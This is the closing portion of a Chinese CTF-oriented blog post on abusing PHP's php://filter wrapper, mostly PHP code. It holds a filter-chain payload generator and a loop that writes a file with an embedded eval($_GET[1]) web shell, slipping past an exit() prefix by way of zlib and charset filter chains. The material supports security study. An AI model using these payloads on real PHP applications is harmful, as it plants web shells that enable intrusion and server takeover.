        <span class="hljs-string">&#x27;SJIS-Mobile#DOCOMO&#x27;</span>,
        <span class="hljs-string">&#x27;SJIS-Mobile#KDDI&#x27;</span>,
        <span class="hljs-string">&#x27;SJIS-Mobile#SOFTBANK&#x27;</span>,
        <span class="hljs-string">&#x27;UTF-8-Mobile#DOCOMO&#x27;</span>,
        <span class="hljs-string">&#x27;UTF-8-Mobile#KDDI-A&#x27;</span>,
        <span class="hljs-string">&#x27;UTF-8-Mobile#KDDI-B&#x27;</span>,
        <span class="hljs-string">&#x27;UTF-8-Mobile#SOFTBANK&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-2022-JP-MOBILE#KDDI&#x27;</span>,
        <span class="hljs-string">&#x27;JIS&#x27;</span>,
        <span class="hljs-string">&#x27;JIS-ms&#x27;</span>,
        <span class="hljs-string">&#x27;CP50220&#x27;</span>,
        <span class="hljs-string">&#x27;CP50220raw&#x27;</span>,
        <span class="hljs-string">&#x27;CP50221&#x27;</span>,
        <span class="hljs-string">&#x27;CP50222&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-1&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-2&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-3&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-4&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-5&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-6&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-7&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-8&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-9&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-10&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-13&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-14&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-15&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-16&#x27;</span>,
        <span class="hljs-string">&#x27;byte2be&#x27;</span>,
        <span class="hljs-string">&#x27;byte2le&#x27;</span>,
        <span class="hljs-string">&#x27;byte4be&#x27;</span>,
        <span class="hljs-string">&#x27;byte4le&#x27;</span>,
        <span class="hljs-string">&#x27;BASE64&#x27;</span>,
        <span class="hljs-string">&#x27;HTML-ENTITIES&#x27;</span>,
        <span class="hljs-string">&#x27;7bit&#x27;</span>,
        <span class="hljs-string">&#x27;8bit&#x27;</span>,
        <span class="hljs-string">&#x27;EUC-CN&#x27;</span>,
        <span class="hljs-string">&#x27;CP936&#x27;</span>,
        <span class="hljs-string">&#x27;GB18030&#x27;</span>,
        <span class="hljs-string">&#x27;HZ&#x27;</span>,
        <span class="hljs-string">&#x27;EUC-TW&#x27;</span>,
        <span class="hljs-string">&#x27;CP950&#x27;</span>,
        <span class="hljs-string">&#x27;BIG-5&#x27;</span>,
        <span class="hljs-string">&#x27;EUC-KR&#x27;</span>,
        <span class="hljs-string">&#x27;UHC&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-2022-KR&#x27;</span>,
        <span class="hljs-string">&#x27;Windows-1251&#x27;</span>,
        <span class="hljs-string">&#x27;Windows-1252&#x27;</span>,
        <span class="hljs-string">&#x27;CP866&#x27;</span>,
        <span class="hljs-string">&#x27;KOI8-R&#x27;</span>,
        <span class="hljs-string">&#x27;KOI8-U&#x27;</span>,
        <span class="hljs-string">&#x27;ArmSCII-8&#x27;</span>,
    ];

    <span class="hljs-keyword">public</span> <span class="hljs-variable">$poc_stack</span> = [
        <span class="hljs-string">&#x27;convert&#x27;</span> =&gt; [
            <span class="hljs-string">&#x27;from&#x27;</span> =&gt; <span class="hljs-string">&#x27;UCS-2LE&#x27;</span>,
            <span class="hljs-string">&#x27;to&#x27;</span> =&gt; <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>
        ],

        <span class="hljs-string">&#x27;string&#x27;</span> =&gt; <span class="hljs-string">&#x27;rot13&#x27;</span>
    ];

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">concatConvert</span>(<span class="hljs-params"><span class="hljs-variable">$convfrom</span>,<span class="hljs-variable">$convto</span></span>)</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;convert.iconv.&#x27;</span>.<span class="hljs-variable">$convfrom</span>.<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$convto</span>.<span class="hljs-string">&#x27;|&#x27;</span>;
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">concatString</span>(<span class="hljs-params"><span class="hljs-variable">$stringop</span></span>)</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;string&#x27;</span>.<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$stringop</span>.<span class="hljs-string">&#x27;|&#x27;</span>;
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">convert</span>(<span class="hljs-params"><span class="hljs-variable">$convfrom</span>,<span class="hljs-variable">$convto</span>,<span class="hljs-variable">$poc</span></span>)</span>&#123;
        <span class="hljs-keyword">return</span> iconv(<span class="hljs-variable">$convfrom</span>,<span class="hljs-variable">$convto</span>,<span class="hljs-variable">$poc</span>);
    &#125;


    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">string</span>(<span class="hljs-params"><span class="hljs-variable">$stringop</span>,<span class="hljs-variable">$poc</span></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;string[<span class="hljs-variable">$stringop</span>](<span class="hljs-variable">$poc</span>);
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Run</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;&quot;</span>;
        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;prefix;
        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;base;
        <span class="hljs-variable">$result_poc</span> = <span class="hljs-string">&quot;&quot;</span>;

        <span class="hljs-keyword">foreach</span> (array_keys(<span class="hljs-keyword">$this</span>-&gt;poc_stack) <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;
            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$item</span> == <span class="hljs-string">&#x27;string&#x27;</span>)&#123;
                <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;concatString(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>]);
                <span class="hljs-keyword">$this</span>-&gt;poc = <span class="hljs-keyword">$this</span>-&gt;string(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>],<span class="hljs-keyword">$this</span>-&gt;poc);
            &#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$item</span>==<span class="hljs-string">&#x27;convert&#x27;</span>)&#123;
                <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;concatConvert(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;from&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;to&#x27;</span>]);
                <span class="hljs-keyword">$this</span>-&gt;poc = <span class="hljs-keyword">$this</span>-&gt;convert(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;from&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;to&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;poc);

            &#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$item</span>==<span class="hljs-string">&#x27;$zlib&#x27;</span>)&#123;
                ;
            &#125;
        &#125;

        <span class="hljs-variable">$tmp</span> = <span class="hljs-variable">$result</span>;

        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;length:&quot;</span>,strlen(<span class="hljs-variable">$tmp</span>),<span class="hljs-string">&quot;\n&quot;</span>;
        <span class="hljs-variable">$padding</span> = <span class="hljs-string">&quot;&quot;</span>;

        <span class="hljs-keyword">switch</span> (<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-string">&#x27;convert&#x27;</span>][<span class="hljs-string">&#x27;from&#x27;</span>])&#123;
            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;UCS-2LE&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>:
                <span class="hljs-variable">$paddingnum</span> = strlen(<span class="hljs-variable">$tmp</span>)%<span class="hljs-number">2</span>;
                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$paddingnum</span> !== <span class="hljs-number">0</span>)&#123;
                    <span class="hljs-variable">$padding</span> = str_repeat(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-variable">$paddingnum</span>);
                &#125;
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">default</span>:
                ;
        &#125;
        
        <span class="hljs-variable">$result</span> .= <span class="hljs-variable">$padding</span>;
        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;poc;
        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;end;
        <span class="hljs-keyword">echo</span> substr(<span class="hljs-variable">$result</span>,strlen(<span class="hljs-keyword">$this</span>-&gt;prefix)),<span class="hljs-string">&quot;\n&quot;</span>;
    &#125;
&#125;


<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Generate();
<span class="hljs-variable">$a</span>-&gt;Run();</code></pre></div>



<h3 id="zlib-deflateä¸zlib-inflate"><a href="#zlib-deflateä¸zlib-inflate" class="headerlink" title="zlib.deflateä¸zlib.inflate"></a>zlib.deflateä¸zlib.inflate</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = [
    <span class="hljs-string">&#x27;string.toupper&#x27;</span>,
    <span class="hljs-string">&#x27;string.tolower&#x27;</span>,
    <span class="hljs-string">&#x27;string.strip_tags&#x27;</span>,
    <span class="hljs-string">&#x27;convert.base64-encode&#x27;</span>,
    <span class="hljs-string">&#x27;convert.base64-decode&#x27;</span>,
    <span class="hljs-string">&#x27;ASCII&#x27;</span>,
    <span class="hljs-string">&#x27;EUC-JP&#x27;</span>,
    <span class="hljs-string">&#x27;SJIS&#x27;</span>,
    <span class="hljs-string">&#x27;eucJP-win&#x27;</span>,
    <span class="hljs-string">&#x27;SJIS-win&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-2022-JP&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-2022-JP-MS&#x27;</span>,
    <span class="hljs-string">&#x27;CP932&#x27;</span>,
    <span class="hljs-string">&#x27;CP51932&#x27;</span>,
    <span class="hljs-string">&#x27;SJIS-mac&#x27;</span>,
    <span class="hljs-string">&#x27;SJIS-Mobile#DOCOMO&#x27;</span>,
    <span class="hljs-string">&#x27;SJIS-Mobile#KDDI&#x27;</span>,
    <span class="hljs-string">&#x27;SJIS-Mobile#SOFTBANK&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-2022-JP-MOBILE#KDDI&#x27;</span>,
    <span class="hljs-string">&#x27;JIS&#x27;</span>,
    <span class="hljs-string">&#x27;JIS-ms&#x27;</span>,
    <span class="hljs-string">&#x27;CP50220&#x27;</span>,
    <span class="hljs-string">&#x27;CP50220raw&#x27;</span>,
    <span class="hljs-string">&#x27;CP50221&#x27;</span>,
    <span class="hljs-string">&#x27;CP50222&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-1&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-2&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-3&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-4&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-5&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-6&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-7&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-8&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-9&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-10&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-13&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-14&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-15&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-16&#x27;</span>,
    <span class="hljs-string">&#x27;byte2be&#x27;</span>,
    <span class="hljs-string">&#x27;byte2le&#x27;</span>,
    <span class="hljs-string">&#x27;byte4be&#x27;</span>,
    <span class="hljs-string">&#x27;byte4le&#x27;</span>,
    <span class="hljs-string">&#x27;BASE64&#x27;</span>,
    <span class="hljs-string">&#x27;HTML-ENTITIES&#x27;</span>,
    <span class="hljs-string">&#x27;7bit&#x27;</span>,
    <span class="hljs-string">&#x27;8bit&#x27;</span>,
    <span class="hljs-string">&#x27;EUC-CN&#x27;</span>,
    <span class="hljs-string">&#x27;CP936&#x27;</span>,
    <span class="hljs-string">&#x27;GB18030&#x27;</span>,
    <span class="hljs-string">&#x27;HZ&#x27;</span>,
    <span class="hljs-string">&#x27;EUC-TW&#x27;</span>,
    <span class="hljs-string">&#x27;CP950&#x27;</span>,
    <span class="hljs-string">&#x27;BIG-5&#x27;</span>,
    <span class="hljs-string">&#x27;EUC-KR&#x27;</span>,
    <span class="hljs-string">&#x27;UHC&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-2022-KR&#x27;</span>,
    <span class="hljs-string">&#x27;Windows-1251&#x27;</span>,
    <span class="hljs-string">&#x27;Windows-1252&#x27;</span>,
    <span class="hljs-string">&#x27;CP866&#x27;</span>,
    <span class="hljs-string">&#x27;KOI8-R&#x27;</span>,
    <span class="hljs-string">&#x27;KOI8-U&#x27;</span>,
    <span class="hljs-string">&#x27;ArmSCII-8&#x27;</span>,
];
@mkdir(<span class="hljs-string">&#x27;./test&#x27;</span>);
@chdir(<span class="hljs-string">&#x27;./test&#x27;</span>);

<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;
    <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;php://filter/zlib.deflate|&#x27;</span> . <span class="hljs-variable">$item</span> . <span class="hljs-string">&#x27;|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=Cyc1e&#x27;</span>.<span class="hljs-variable">$item</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;
    file_put_contents(<span class="hljs-variable">$content</span>, <span class="hljs-string">&#x27;&lt;?php exit();&#x27;</span> . <span class="hljs-variable">$content</span>);
&#125;
</code></pre></div>







<h1 id="å‚è€ƒåŠè½¬è½½èµ„æ–™"><a href="#å‚è€ƒåŠè½¬è½½èµ„æ–™" class="headerlink" title="å‚è€ƒåŠè½¬è½½èµ„æ–™"></a>å‚è€ƒåŠè½¬è½½èµ„æ–™</h1><ul>
<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨</a></li>
<li><a target="_blank" rel="noopener" href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/">å…³äºfile_put_contentsçš„ä¸€äº›å°æµ‹è¯•</a></li>
<li><a target="_blank" rel="noopener" href="https://cyc1e183.github.io/2020/08/04/WMctf2020-Checkin%E5%87%BA%E9%A2%98%E6%83%B3%E6%B3%95-%E9%A2%98%E8%A7%A3/">WMctf2020 Checkinå‡ºé¢˜æƒ³æ³•&amp;é¢˜è§£</a></li>
</ul>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/web%E5%AE%89%E5%85%A8/">webå®‰å…¨</a>
                    
                      <a class="hover-with-bg" href="/categories/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">æ–‡ä»¶åŒ…å«</a>
                    
                      <a class="hover-with-bg" href="/categories/php/">php</a>
                    
                      <a class="hover-with-bg" href="/categories/php/%E4%BC%AA%E5%8D%8F%E8%AE%AE/">ä¼ªåè®®</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/web%E5%AE%89%E5%85%A8/">webå®‰å…¨</a>
                    
                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
                    
                      <a class="hover-with-bg" href="/tags/php/">php</a>
                    
                      <a class="hover-with-bg" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">æ–‡ä»¶åŒ…å«</a>
                    
                      <a class="hover-with-bg" href="/tags/php-filer/">php://filer</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 åè®®</a> ï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2020/10/28/linux-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">linux å‘½ä»¤æ‰§è¡Œç»•è¿‡æ€è·¯</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2020/10/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7-BloodHound-%E5%9F%BA%E6%9C%AC%E5%AE%89%E8%A3%85/">
                        <span class="hidden-mobile">åŸŸæ¸—é€åˆ†æå·¥å…· BloodHound-åŸºæœ¬å®‰è£…</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments">
                
                
  <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
      var disqus_config = function() {
        this.page.url = 'https://greydr34d.github.io/2020/10/28/php-filter%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/';
        this.page.identifier = '/2020/10/28/php-filter%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/';
      };
      Fluid.utils.waitElementVisible('disqus_thread', function () {
        var d = document, s = d.createElement('script');
        s.src = '//' + '' + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', new Date());
        (d.head || d.body).appendChild(s);
      });
    </script>
    <noscript>Please enable JavaScript to view the
      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="nofollow noopener noopener">comments powered by Disqus.</a>
    </noscript>
  </div>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;ç›®å½•</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->




  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>






  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>















<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ ä¿æŒåœ¨æœ€åº•éƒ¨ -->
<script  src="/js/boot.js" ></script>



</body>
</html>
